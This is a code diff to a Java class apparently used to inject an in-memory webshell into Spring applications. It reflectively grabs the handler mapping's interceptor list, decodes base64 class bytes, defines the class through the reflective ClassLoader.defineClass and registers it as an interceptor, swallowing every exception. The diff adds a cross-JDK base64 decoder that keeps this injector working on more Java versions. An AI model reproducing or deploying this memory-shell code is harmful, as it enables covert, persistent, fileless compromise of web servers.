@@ -47,7 +47,7 @@ public class SpringInterceptorMS  {
             java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
 
             // 加载 SpringInterceptorTemplate 类的字节码
-            byte[]                   bytes       = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
+            byte[]                   bytes       = base64Decode(b64);
             java.lang.ClassLoader    classLoader = Thread.currentThread().getContextClassLoader();
             java.lang.reflect.Method m0          = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
             m0.setAccessible(true);
@@ -56,5 +56,23 @@ public class SpringInterceptorMS  {
             adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
         } catch (Exception ignored) {
         }
+    }
+
+    public static byte[] base64Decode(String bs) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+            } catch (Exception e2) {
+            }
+        }
+        return value;
     }
 }
